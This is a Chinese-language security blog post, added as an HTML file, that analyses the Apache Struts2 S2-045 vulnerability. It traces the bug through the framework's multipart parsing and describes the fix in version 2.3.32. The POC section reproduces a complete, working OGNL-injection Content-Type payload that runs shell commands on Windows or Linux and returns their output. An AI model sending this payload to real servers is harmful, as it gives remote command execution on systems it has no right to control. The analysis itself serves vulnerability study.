@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>S2-045调试分析 - sn00py</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=漏洞分析>
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="sn00py" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">sn00py</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/archives" class="menu-item-link">Archives</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/friends/" class="menu-item-link">Frinds</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">S2-045调试分析</h1>
+  </div>
+   <div class="post-meta">
+    <span class="post-time">2018-04-10</span>
+  </div>
+  <div class="post-content">
+    <h2 id="0x00-代码"><a href="#0x00-代码" class="headerlink" title="0x00 代码"></a>0x00 代码</h2><h2 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01 POC"></a>0x01 POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#memberAccess?(#memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;&quot;ipconfig&quot;&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;; boundary=----WebKitFormBoundary5EXHV5bE9uMnekg3</span><br></pre></td></tr></table></figure>
+<p>开头的<code>%</code>换成<code>$</code>也是可以的.</p>
+<p>这个POC作者构造的很漂亮,兼容windows和linux,并且能回显.</p>
+<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>根据官网的描述,如果处理文件上传时使用的时Jakarta解析器,就可能导致命令执行.</p>
+<p>org.apache.struts2.dispatcher.Dispatcher中的wrapRequest()方法用于将HTTP请求包装成一个对象,所以我们在这里下断.</p>
+<p><img src="/2018/04/10/S2-045调试分析/01.jpg" alt=""></p>
+<p>首先判断请求是否已经包装过.</p>
+<p>然后获取了<code>content_type</code>,如果content_type包含<code>multipart/form-data</code>,就创建一个<code>MultiPartRequestWrapper()</code>对象.</p>
+<p>跟进,到达org.apache.struts2.dispatcher.multipart.MultiPartRequestWrapper:78,</p>
+<p><img src="/2018/04/10/S2-045调试分析/02.jpg" alt=""></p>
+<p>跟进parse(),到达org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest:89,</p>
+<p><img src="/2018/04/10/S2-045调试分析/03.jpg" alt=""></p>
+<p>由于我们传入的content-type不对,这里会触发异常.</p>
+<p>注意这里异常消息里包含了我们传入的恶意content-type,然后进入了buildErrorMessage().</p>
+<p>经过一系列传递,调用栈如下,</p>
+<p><img src="/2018/04/10/S2-045调试分析/04.jpg" alt=""></p>
+<p>传入的content-type进入evaluate(),在com.opensymphony.xwork2.util.OgnlTextParser:8.</p>
+<p><img src="/2018/04/10/S2-045调试分析/05.jpg" alt=""></p>
+<p>这个函数就很眼熟了,之前在S2-001就看过了,就是取出<code>{}</code>里的内容,然后作为OGNL执行.</p>
+<p>所以,整个漏洞的流程就是这样.</p>
+<h2 id="0x03-修复"><a href="#0x03-修复" class="headerlink" title="0x03 修复"></a>0x03 修复</h2><p>在Struts 2.3.32版本中,</p>
+<p><img src="/2018/04/10/S2-045调试分析/06.png" alt=""></p>
+<p>LocalizedTextUtil.findText()传入的参数是null,而不是外部提交的content-type了.</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>045和046原理差不多,046是在<code>Content-Length</code>里注入.</p>
+<p>不知道下一个St2的表达式注入又会是在哪呢?</p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-045</a></p>
+
+  </div>
+  <div class="post-footer">
+    
+      <ul class="post-tag-list"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+<footer>
+  &copy; 2018
+  <span class="author">
+    sn00py
+  </span>
+</footer>
+    </div>
+  </body>
+</html>
